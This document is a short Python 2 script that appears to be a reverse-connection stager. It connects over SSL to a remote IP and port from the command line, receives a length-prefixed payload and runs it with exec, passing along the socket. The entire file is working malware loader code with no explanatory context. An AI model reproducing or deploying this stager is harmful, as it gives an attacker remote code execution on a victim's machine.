#!/usr/bin/env python
#
import ssl,socket,struct,time,sys
if len(sys.argv) < 3:
    print "Usage: [remote ip] [port]"
    sys.exit(0)
address = sys.argv[1]
port = sys.argv[2]

for x in range(5):
	try:
		so=socket.socket(2,1)
		so.connect((str(address),int(port)))
		s=ssl.wrap_socket(so)
		break
	except:
		time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})
